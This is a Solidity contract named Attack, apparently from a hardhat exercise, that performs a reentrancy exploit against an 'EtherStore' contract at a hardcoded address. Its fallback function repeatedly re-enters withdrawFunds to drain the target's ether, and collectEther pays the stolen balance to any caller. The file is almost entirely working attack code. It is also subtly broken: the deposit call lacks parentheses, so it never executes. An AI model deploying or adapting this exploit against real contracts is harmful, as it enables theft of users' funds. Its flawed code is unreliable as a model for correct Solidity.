// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

import "hardhat/console.sol";

interface IEtherStore {
    function depositFunds() external payable;
    function withdrawFunds(uint256) external;
}

contract Attack {
  address public etherStore = address(0x032ACfAFb4Ffa8acb556e4b7535Ee542bc152726);
  // intialise the etherStore variable with the contract address
//   constructor(address _etherStoreAddress) {
//       etherStore = EtherStore(_etherStoreAddress);
//   }
  
  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether, "Need 1 ether or more.");
      // send eth to the depositFunds() function
      IEtherStore(etherStore).depositFunds{value: 1 ether};
      // start the magic
      IEtherStore(etherStore).withdrawFunds(1000000000000000000);
  }
  
  function collectEther() public payable {
      payable(msg.sender).transfer(address(this).balance);
  }

  function getBal() public returns (uint256){
      return address(IEtherStore(etherStore)).balance;
  }
    
  // fallback function - where the magic happens
  fallback () external payable {
      console.log("In the fallback function!");
      console.log(address(IEtherStore(etherStore)).balance);

      if (address(IEtherStore(etherStore)).balance > 1 ether) {
          IEtherStore(etherStore).withdrawFunds(1000000000000000000);
      }
  }
}
